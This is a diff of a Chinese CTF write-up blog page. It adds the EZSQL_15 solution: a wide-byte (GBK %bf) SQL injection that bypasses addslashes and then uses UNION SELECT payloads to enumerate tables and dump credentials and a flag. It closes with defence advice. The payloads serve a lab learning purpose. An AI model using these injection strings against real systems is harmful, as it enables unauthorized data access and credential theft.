@@ -339,7 +339,7 @@
         <li><a href="#ezsql_12字符型-sql-注入---报错回显--extractvalue-错误注入">EZSQL_12(字符型 SQL 注入 - 报错回显 + extractvalue 错误注入)</a></li>
         <li><a href="#ezsql_13字符型-sql-注入---布尔盲注---无数据显示">EZSQL_13(字符型 SQL 注入 - 布尔盲注 - 无数据显示)</a></li>
         <li><a href="#ezsql_14字符型-sql-注入---时间盲注---无数据显示">EZSQL_14(字符型 SQL 注入 - 时间盲注 - 无数据显示)</a></li>
-        <li><a href="#ezsql_15">EZSQL_15</a></li>
+        <li><a href="#ezsql_15字符型-sql-注入---宽字节注入绕过-addslashes--union-联合查询注入">EZSQL_15(字符型 SQL 注入 - 宽字节注入绕过 addslashes + UNION 联合查询注入)</a></li>
         <li><a href="#ezsql_16">EZSQL_16</a></li>
         <li><a href="#ezsql_17">EZSQL_17</a></li>
         <li><a href="#ezsql_18">EZSQL_18</a></li>
@@ -473,7 +473,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 29 分钟
+                    阅读时长: 30 分钟
                 </time>
             </div>
         
@@ -490,7 +490,7 @@
 
 
 
-                <span class="article-time--wordcount">14244 字</span>
+                <span class="article-time--wordcount">15022 字</span>
             </div>
         
     </footer>
@@ -2267,8 +2267,63 @@ env 或 printenv 才能看见。</p>
 </div>
 </div><p>提取全部 42 个字符，得到 <code>flag{eaaa6edb-1425-4cca-9060-4db595c17008}</code></p>
 <p><strong>复盘</strong>：这题的核心是<strong>时间盲注</strong>——页面不显示查询数据，且布尔条件无响应差异，只能通过 <code>sleep()</code> 函数的延迟来判断条件真假。与布尔盲注相比，时间盲注的每个请求都需要等待 sleep 时间，提取速度更慢。字符型注入需要用 <code>'</code> 闭合和 <code>#</code> 注释。做 SQL 注入题遇到无数据显示且无布尔差异时，时间盲注是标准解法</p>
-<h3 id="ezsql_15">EZSQL_15
-</h3><h3 id="ezsql_16">EZSQL_16
+<h3 id="ezsql_15字符型-sql-注入---宽字节注入绕过-addslashes--union-联合查询注入">EZSQL_15(字符型 SQL 注入 - 宽字节注入绕过 addslashes + UNION 联合查询注入)
+</h3><p>访问靶机，页面是一个登录表单，GET 方法提交 <code>username</code> 和 <code>password</code> 两个参数
+正常登录 <code>admin</code> / <code>admin123</code>，返回 <code>Welcome admin</code>
+测试单引号注入 <code>admin'#</code>，返回 <code>Login failed.</code>，没有报错。尝试各种注入 payload（<code>admin'--+-</code>、<code>admin' or '1'='1</code>、<code>admin'#</code>）全部返回 <code>Login failed.</code>，说明后端对单引号做了转义处理（<code>addslashes()</code> 或 <code>mysql_real_escape_string()</code>）
+关键发现：<code>admin%bf' or 1=1-- -</code> 返回 <code>Welcome admin</code>，说明存在<strong>宽字节注入（Wide-Byte Injection）</strong>。原理是 <code>addslashes()</code> 在单引号前添加反斜杠 <code>\</code>（<code>%5c</code>），而 <code>%bf%5c</code> 在 GBK 编码中是一个合法的双字节字符，反斜杠被&quot;吃掉&quot;，单引号 <code>%27</code> 逃逸出来
+确定列数，依次测试 1~8 列：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1%bf%27 union select 1,2,3,4-- -&amp;password=x
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>4 列时返回 <code>Welcome 2</code>，确认查询有 <strong>4 列</strong>，回显位在第 2 列
+获取数据库名和版本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1%bf%27 union select 1,database(),3,4-- -&amp;password=x
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>数据库名为 <code>user</code>，版本为 MariaDB 10.4.13
+枚举当前数据库的表：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1%bf%27 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()-- -&amp;password=x
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只有一张表：<code>flag</code>
+查看 flag 表的列名（表名用十六进制 <code>0x666c6167</code> 绕过单引号转义）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1%bf%27 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=0x666c6167-- -&amp;password=x
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>四列：<code>id</code>、<code>name</code>、<code>passwd</code>、<code>secret</code>
+直接 dump flag 表：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1%bf%27 union select 1,group_concat(id,0x3a,name,0x3a,passwd,0x3a,secret),3,4 from flag-- -&amp;password=x
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>1:admin:admin123:flag{6746fd7a-7c7e-4681-a63a-2aa67e5b3d80}</code>，成功获得 flag</p>
+<p><strong>复盘</strong>：这题的核心是<strong>宽字节注入（Wide-Byte Injection）</strong>。后端使用 <code>addslashes()</code> 对单引号进行转义，但在 GBK 编码环境下，<code>%bf%5c</code> 构成一个合法的双字节字符，吞掉了转义用的反斜杠，使单引号逃逸。绕过方式是在注入的单引号前添加 <code>%bf</code>（或其他高字节如 <code>%81</code>~<code>%fe</code>）。防御时应使用 <code>mysql_set_charset()</code> 设置字符集而非 <code>addslashes()</code>，或统一使用参数化查询（Prepared Statements）</p>
+<h3 id="ezsql_16">EZSQL_16
 </h3><h3 id="ezsql_17">EZSQL_17
 </h3><h3 id="ezsql_18">EZSQL_18
 </h3><h3 id="ezsql_19">EZSQL_19
